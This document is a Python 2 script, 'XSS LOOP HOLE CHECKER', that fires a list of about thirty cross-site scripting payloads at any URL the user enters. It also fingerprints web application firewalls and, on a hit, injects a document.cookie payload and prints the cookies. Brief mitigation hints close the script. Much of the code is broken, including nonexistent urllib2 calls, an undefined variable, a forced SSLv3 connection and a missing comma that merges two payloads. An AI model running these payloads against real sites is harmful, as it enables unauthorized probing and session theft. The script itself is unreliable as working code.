# -*- coding: cp1252 -*-
import urllib2
from urllib2 import Request, build_opener, HTTPCookieProcessor, HTTPHandler
import urllib
from urllib import FancyURLopener
import cookielib
import socket
import time
import re
import sys
import httplib
import colorama
import ssl
from functools import partial
import custom 
from colorama import Fore, Back, Style
from colorama import init
colorama.init()

print "\n\t\t#################################################"
print "\t\t#                                               #"
print "\t\t#              XSS LOOP HOLE CHECKER            #"
print "\t\t#                  BY WARLOCK                   #"
print "\t\t#                                               #"
print "\t\t#################################################"


###Cross Site Scripting Payloads###
xss_attack = ["%22%3Cscript%3Ealert%28%27XSSYA%27%29%3C%2Fscript%3E",
              "1%253CScRiPt%2520%253Eprompt%28962477%29%253C%2fsCripT%253E",
                "<script>alert('xssya')</script>",
                "'';!--\"<XSS>=&{()}",
                "%3CScRipt%3EALeRt(%27xssya%27)%3B%3C%2FsCRipT%3E"
                "<scr<script>ipt>alert(1)</scr<script>ipt>",
                "%3cscript%3ealert(%27XSSYA%27)%3c%2fscript%3e",
                "%3cbody%2fonhashchange%3dalert(1)%3e%3ca+href%3d%23%3eclickit",
                "%3cimg+src%3dx+onerror%3dprompt(1)%3b%3e%0d%0a",
                "%3cvideo+src%3dx+onerror%3dprompt(1)%3b%3e",
                "<iframesrc=\"javascript:alert(2)\">",
                "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
                "<form action=\"Javascript:alert(1)\"><input type=submit>",
                "<isindex action=data:text/html, type=image>",
                "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">",
                "<svg/onload=prompt(1);>",
                "<marquee/onstart=confirm(2)>/",
                "<body onload=prompt(1);>",
                "<q/oncut=open()>",
                "<a onmouseover=location=’javascript:alert(1)>click",
                "<svg><script>alert&#40/1/&#41</script>",
                "&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
                "<scri%00pt>alert(1);</scri%00pt>",
                "<scri%00pt>confirm(0);</scri%00pt>",
                "5\x72\x74\x28\x30\x29\x3B'>rhainfosec",
                "<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>",
                "<marquee/onstart=confirm(2)>",
                "<A HREF=\"http://www.google.com./\">XSS</A>",
                "<svg/onload=prompt(1);>"]






class MyOpener(FancyURLopener):
    version = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11'
        
myopener = MyOpener()


class fake_ssl:
    wrap_socket = partial(ssl.wrap_socket, ssl_version=ssl.PROTOCOL_SSLv3)

httplib.ssl = fake_ssl



class JSHTTPCookieProcessor(urllib2.BaseHandler):
    handler_order = 400 






#Function In Case of Crawling 
def xss(exploit):
    for link in links:
        print"[+]TESTING:",link[0]+exploit
        try:
            if xi != 0:
                handler = urllib2.Handler({'http': 'http://' + '/'})
                opener = urllib2.build_opener(link[0]+exploit, handler)
                source = opener.open(link[0]+exploit).read()
            else:
                source = myopener.open(link[0]+exploit).read()
                print "Source Length:",len(source)
            if re.search("xss", source.lower()) != None:
                print "\n[+]URL WITH PAYLOAD:",link[0]+exploit
            else:
                print  "[-]NO LOOP HOLE FOUND" 
        except(urllib2.HTTPError), msg:
            print "[-]ERROR:",msg
            pass


#Function in case of Vulnerability Confirmation        
def xxs2(exploi):
    print "\n[+]TESTING",host+exploi
    try:
        if xi != 0:
            handle = urllib2.Handler({'http': 'http://' + '/'})
            opene = urllib2.build_opener(host+exploit, handle)
            sourc = opene.open(host+exploit).read()
        else:
            sourc = myopener.open(host+exploi).read()
            print " Source Length:",len(sourc)
            ##Detecting WAF if Exist
            if res1.code == 406:
                print "[-]WEB APPLICATION FIREWALL FOUND => (Mod_Security)"
            elif res1.code == 999:
                print "[-]WEB APPLICATION FIREWALL FOUND => WebKnight"
                time.sleep(5)
            elif res1.code == 419:
                print "[-]WEB APPLICATION FIREWALL FOUND => F5 BIG IP"
            else:
                print "[+]NO FIREWALL FOUND ON THIS WEB APPLICATION"
        if re.search("xss", sourc.lower()) != None:
            print "\n[+]URL WITH PAYLOAD:",host+exploi
                
            
        else:
            print "[-]NO LOOP HOLE FOUND"
    except(urllib2.HTTPError), msg:
        print "[-]ERROR:",msg
        pass
        

print"\n[+]PLEASE ENTER A URL AS BELOW SHOWN.....\n"
print "- Example: http://www.doamin.com/ "
print "- Example: http://www.domain.com= "
print "- Example: http://www.domain.com? "
print"\n[+]IF YOU DON't HAVE THESE TYPE OF URL PLEASE USE CRAWLER..."
host = raw_input("\n\n[+]ENTER UEL OR WEBSITE: ")
res = myopener.open(host)
res1= urllib.urlopen(host)
html = res.read()
links = re.findall('"((http|href)s?://.*?)"', html)



print "PRESS 1 FOR XSS LOOP HOLE CONFIRMATION"
print "PRESS 2 TO SCAN WEBSITE FOR XSS LOOP HOLE"
print ""
choice = raw_input('PLEASE ENTER CHOICE: ')
print ""
print res.info()
myfile = res.read()
print ""      


if host[-1:] != "/":
    print"[+]LOADING..."
elif host [-1:] != "=":
    print"[+]LOADING..."	
elif host [-1:] != "?":
    sys.exit(1)



### Testing the connection ###    
try:
    if sys.argv[3]:
        xi = sys.argv[3]
        print "[+]TESTING CONNECTION..."
        h2 = httplib.ssl(xi)
        h2.connect()
        print "[+] xi:",xi
except(socket.timeout):
    print "[-]CONNECTION TIMED OUT..."
    xi = 0
    pass
except:
    print ""
    xi = 0
    pass


### Print the result in Case of Crawling###
if('2' in choice):
    print"\n[-]SORRY BUT..."
    print"[-]PLEASE WAIT FOR THE NEXT VERSION TO LAUCH..."
    sys.exit(1)


### Print the result in case of Vulnerable Link Confirmation###
else:
    print "SCANNING THE TARGET URL OR WEBSITE:",host
    print "[+]PAYLOADS LOADED:",len(xss_attack),"payloads\n"
    for exploi in xss_attack:
        time.sleep(5)
        xxs2(exploi.replace("\n",""))


###Confirm by Searching Payload in Web Page###
        heer = custom.check()
        bb = "[+]XSS LOOP HOLE FOUND"
        cc = "[-]FALSE POSITIVE"
        try:
            mam = myopener.open(host+exploi).read()
            found = False
            for payload in heer.hit:
                if payload in mam:
                    found = True
            if found:                
                print Fore.RED+bb
                #Getting COKKIES 
                cj = cookielib.CookieJar()
                opener = build_opener(HTTPCookieProcessor(cj), HTTPHandler())
                xss_cookie = "%3cscript%3ealert(document.cookie)%3c/script%3e"
                url1 = (host+xss_cookie)
                req = Request(url1, headers={'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"})
                f = opener.open(req)
                html = f.read()
                print "Excute document.cookie"
                time.sleep (3)
                print ""
                for cookie in cj:
                    print Fore.CYAN + "==>", cookie
            else:
                
                print cc
                
        except urllib2.HTTPError:
            print "Error"



           
### Save Wbe Page Code for Manual Check###        
print ""
print ""
codehtml = raw_input("[+]DO YOU WANT TO SAVE PAGE SOURCE CODE?(y/n): ")
sas1 = host + '"><h1>r7hf72hds882js88d2</h1> '
sas = host
if ('y' in codehtml):
    urllib.urlretrieve(sas,'./scan_js.txt')
    urllib.urlretrieve(sas1,'./scan_html.txt')
else:
    pass



###Print Web Page Code in the Screen###
print ""
codehtml = raw_input("[+]DO YOU WANT TO PRINT HTML CODE?(y/n): ")
if ('y' in codehtml):
    data = urllib2.urlopen(host)
    print data.info()
    myfile = data.read()
    print Fore.WHITE + myfile
else:
    print Fore.CYAN



print"\n[+]DO YOU FOUND XSS LOOP HOLE IN YOUR WEBSITE???"
o=raw_input("y or n : ")

if o=='y':
  print"\n[+]DO WANT SOME HINTS TO STOP THIS ATTACK ???"
  v=raw_input("y or n : ")
  if v=='y':
    print"\n[+]STEP 1.  FILTER INPUT FIELDS(e.g. search field,comment field )FOR SCRIPTS (java scripts,html scripts) FROM YOUR WEB APPLIACTAION"
    print"\n[+]STEP 2.  MAKE YOUR DATABASE TO READ ONLY"
    print'\n[+]STEP 3.  USE FIREWALL OR IDS'
    print"\n[+}STEP 4.  IF YOU ARE COMPLETLY UNKNOWN TO THIS STUFF...PLEASE EMAIL ME AT nisargjani20996@gmail.com OR CONSULT TO PENTESTERS / IT CONSULTERS"
  else:
    pass
else:
  pass
